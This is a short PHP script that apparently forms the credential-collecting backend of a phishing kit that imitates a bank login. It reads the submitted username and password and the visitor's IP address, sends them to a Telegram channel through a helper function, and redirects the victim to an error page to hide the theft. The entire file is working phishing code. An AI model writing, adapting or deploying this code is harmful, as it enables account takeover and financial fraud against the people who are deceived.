<?php


include '../conf.ini.php';


    $mss = "➖[CU5C4TL4N]➖➖➖
💵 USR : {$_POST['user']}
💵 PSW : {$_POST['pass']}
➖➖➖ INFO ➖➖➖
🌐 IP : {$_SERVER['REMOTE_ADDR']}
➖➖➖➖➖➖➖➖➖➖➖➖";

enviar_telegram($mss);

header('location: ../error.php');

?>

